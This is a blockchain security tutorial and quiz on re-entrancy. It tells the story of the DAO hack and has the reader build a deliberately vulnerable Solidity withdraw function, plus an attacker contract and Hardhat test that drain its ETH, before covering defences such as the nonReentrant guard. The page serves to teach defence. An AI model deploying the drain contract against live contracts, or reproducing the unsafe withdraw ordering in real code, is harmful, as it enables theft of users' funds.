# Re-Entrancy
LearnWeb3 Tutorial for preventing re-entrancy attacks

Lesson Type: Quiz
Estimated Time: 1-2 hours
Current Score: 0%
Re-Entrancy
Re-Entrancy is one of the oldest security vulnerabilities that was discovered in smart contracts. It is the exact vulnerability that caused the infamous 'DAO Hack' of 2016. Over 3.6 million ETH was stolen in the hack, which today is worth billions of dollars. 🤯

At the time, the DAO contained 15% of all Ethereum on the network as Ethereum was relatively new. The failure was having a negative impact on the Ethereum network, and Vitalik Buterin proposed a software fork where the attacker would never be able to transfer out his ETH. Some people agreed, some did not. This was a highly controversial event, and one which still is full of controversy.

At the end, it led to Ethereum being forked into two - Ethereum Classic, and the Ethereum we know today. Ethereum Classic's blockchain is the exact same as Ethereum up until the fork, but then proceeded as if the hack did happen and the attacker still controls the stolen funds. Today's Ethereum implemented the blacklist and it's as if that attack never happened. 🤔

This is a simplified version of that story, and the entire dynamic was quite complex. Everyone was stuck between a rock and a hard place. You can read more about this story here to know what happened in more detail

Let's learn more about this hack! 🚀

🤔 Why did the original Ethereum blockchain split into Ethereum and Ethereum Classic?


Due to differing opinions within the community about how to handle the DAO Hack

Due to potential profits of splitting the token into two

Due to different versions of Solidity being used for programming
What is Re-Entrancy?
Image

Re-Entrancy is the vulnerability in which if Contract A calls a function in Contract B, Contract B can then call back into Contract A while Contract A is still processing.

This can lead to some serious vulnerabilities in Smart contracts, often creating the possibility of draining funds from a contract.

Let's understand how this works with the example shown in the above diagram. Let's say Contract A has some function - call it f() that does 3 things:

Checks the balance of ETH deposited into Contract A by Contract B
Sends the ETH back to Contract B
Updates the balance of Contract B to 0
Since the balance gets updated after the ETH has been sent, Contract B can do some tricky stuff here. If Contract B was to create a fallback() or receive() function in it's contract, which would execute when it received ETH, it could call f() in Contract A again.

Since Contract A hasn't yet updated the balance of Contract B to be 0 at that point, it would send ETH to Contract B again - and herein lies the exploit, and Contract B could keep doing this until Contract A was completely out of ETH.

BUIDL
We will create a couple of smart contracts, GoodContract and BadContract to demonstrate this behaviour. BadContract will be able to drain all the ETH out from GoodContract.

Note All of these commands should work smoothly . If you are on windows and face Errors Like Cannot read properties of null (reading 'pickAlgorithm') Try Clearing the NPM cache using npm cache clear --force.

Lets build an example where you can experience how the Re-Entrancy attack happens.

To set up a Hardhat project, Open up a terminal and execute these commands

npm init --yes
npm install --save-dev hardhat
If you are on a Windows machine, please do this extra step and install these libraries as well :)

npm install --save-dev @nomicfoundation/hardhat-toolbox @nomiclabs/hardhat-waffle ethereum-waffle chai @nomiclabs/hardhat-ethers ethers
In the same directory where you installed Hardhat run:

npx hardhat
Select Create a basic sample project
Press enter for the already specified Hardhat Project root
Press enter for the question on if you want to add a .gitignore
Press enter for Do you want to install this sample project's dependencies with npm (@nomiclabs/hardhat-waffle ethereum-waffle chai @nomiclabs/hardhat-ethers ethers)?
Now you have a hardhat project ready to go!

Let's start by creating a new file inside the contracts directory called GoodContract.sol

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

contract GoodContract {

    mapping(address => uint) public balances;

    // Update the `balances` mapping to include the new ETH deposited by msg.sender
    function addBalance() public payable {
        balances[msg.sender] += msg.value;
    }

    // Send ETH worth `balances[msg.sender]` back to msg.sender
    function withdraw() public {
        require(balances[msg.sender] > 0);
        (bool sent, ) = msg.sender.call{value: balances[msg.sender]}("");
        require(sent, "Failed to send ether");
        // This code becomes unreachable because the contract's balance is drained
        // before user's balance could have been set to 0
        balances[msg.sender] = 0;
    }
}
The contract is quite simple. The first function, addBalance updates a mapping to reflect how much ETH has been deposited into this contract by another address. The second function, withdraw, allows users to withdraw their ETH back - but the ETH is sent before the balance is updated.

Now lets create another file inside the contracts directory known as BadContract.sol

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import "./GoodContract.sol";

contract BadContract {
    GoodContract public goodContract;
    constructor(address _goodContractAddress) {
        goodContract = GoodContract(_goodContractAddress);
    }

    // Function to receive Ether
    receive() external payable {
        if(address(goodContract).balance > 0) {
            goodContract.withdraw();
        }
    }

    // Starts the attack
    function attack() public payable {
        goodContract.addBalance{value: msg.value}();
        goodContract.withdraw();
    }
}
This contract is much more interesting, let's understand what is going on.

Within the constructor, this contract sets the address of GoodContract and initializes an instance of it.

The attack function is a payable function that takes some ETH from the attacker, deposits it into GoodContract, and then calls the withdraw function in GoodContract.

At this point, GoodContract will see that BadContract has a balance greater than 0, so it will send some ETH back to BadContract. However, doing this will trigger the receive() function in BadContract.

The receive() function will check if GoodContract still has a balance greater than 0 ETH, and call the withdraw function in GoodContract again.

This will create a loop where GoodContract will keep sending money to BadContract until it completely runs out of funds, and then finally reach a point where it updates BadContract's balance to 0 and completes the transaction execution. At this point, the attacker has successfully stolen all the ETH from GoodContract due to re-entrancy.

We will utilize Hardhat Tests to demonstrate that this attack actually works, to ensure that BadContract is actually draining all the funds from GoodContract. You can read the Hardhat Docs for Testing to get familiar with the testing environment.

Let's start off by creating a file named attack.js under the test folder, and add the following code there:

const { expect } = require("chai");
const { BigNumber } = require("ethers");
const { parseEther } = require("ethers/lib/utils");
const { ethers } = require("hardhat");

describe("Attack", function () {
  it("Should empty the balance of the good contract", async function () {
    // Deploy the good contract
    const goodContractFactory = await ethers.getContractFactory("GoodContract");
    const goodContract = await goodContractFactory.deploy();
    await goodContract.deployed();

    //Deploy the bad contract
    const badContractFactory = await ethers.getContractFactory("BadContract");
    const badContract = await badContractFactory.deploy(goodContract.address);
    await badContract.deployed();

    // Get two addresses, treat one as innocent user and one as attacker
    const [_, innocentAddress, attackerAddress] = await ethers.getSigners();

    // Innocent User deposits 10 ETH into GoodContract
    let tx = await goodContract.connect(innocentAddress).addBalance({
      value: parseEther("10"),
    });
    await tx.wait();

    // Check that at this point the GoodContract's balance is 10 ETH
    let balanceETH = await ethers.provider.getBalance(goodContract.address);
    expect(balanceETH).to.equal(parseEther("10"));

    // Attacker calls the `attack` function on BadContract
    // and sends 1 ETH
    tx = await badContract.connect(attackerAddress).attack({
      value: parseEther("1"),
    });
    await tx.wait();

    // Balance of the GoodContract's address is now zero
    balanceETH = await ethers.provider.getBalance(goodContract.address);
    expect(balanceETH).to.equal(BigNumber.from("0"));

    // Balance of BadContract is now 11 ETH (10 ETH stolen + 1 ETH from attacker)
    balanceETH = await ethers.provider.getBalance(badContract.address);
    expect(balanceETH).to.equal(parseEther("11"));
  });
});
In this test, we first deploy both GoodContract and BadContract.

We then get two signers from Hardhat - the testing account gives us access to 10 accounts which are pre-funded with ETH. We treat one as an innocent user, and the other as the attacker.

We have the innocent user send 10 ETH to GoodContract. Then, the attacker starts the attack by calling attack() on BadContract and sending 1 ETH to it.

After the attack() transaction is finished, we check to see that GoodContract now has 0 ETH left, whereas BadContract now has 11 ETH (10 ETH that was stolen, and 1 ETH the attacker deposited).

To finally execute the test, on your terminal type:

npx hardhat test
If all your tests are passing, then the attack succeeded!

🤔 If you were building an ERC-721 contract where you wanted to let certain users, tracked through the `balances` mapping, to claim 1 NFT of their choice. Is this code vulnerable to a re-entrancy attack? (Hint: Think about what _safeMint does)

If you were building an ERC-721 contract where you wanted to let certain users, tracked through the `balances` mapping, to claim 1 NFT of their choice. Is this code vulnerable to a re-entrancy attack? (Hint: Think about what _safeMint does)

Yes

No
Prevention
There are two things you can do.

Either, you could recognize that this function was vulnerable to re-entrancy, and make sure you update the user's balance in the withdraw function before you actually send them the ETH, so if they try to callback into withdraw it will fail.

Alternatively, OpenZeppelin has a ReentrancyGuard library that provides a modifier named nonReentrant which blocks re-entrancy in functions you apply it to. It basically works like the following:

modifier nonReentrant() {
    require(!locked, "No re-entrancy");
    locked = true;
    _;
    locked = false;
}
If you were to apply this on the withdraw function, the callbacks into withdraw would fail because locked will be equal to true until the first withdraw function finishes executing, thereby also preventing re-entrancy.

🤔 Is the following withdraw() function susceptible to a Re-entrancy attack?

Is the following withdraw() function susceptible to a Re-entrancy attack?

Yes

No
🤔 Re-entrancy can be prevented by using an OpenZeppelin modifier?


True

False
Readings
These are optional, but recommended, readings

DAO Hack
Reentrancy Guard Library
Hardhat Testing
Submit Quiz
3 / 4
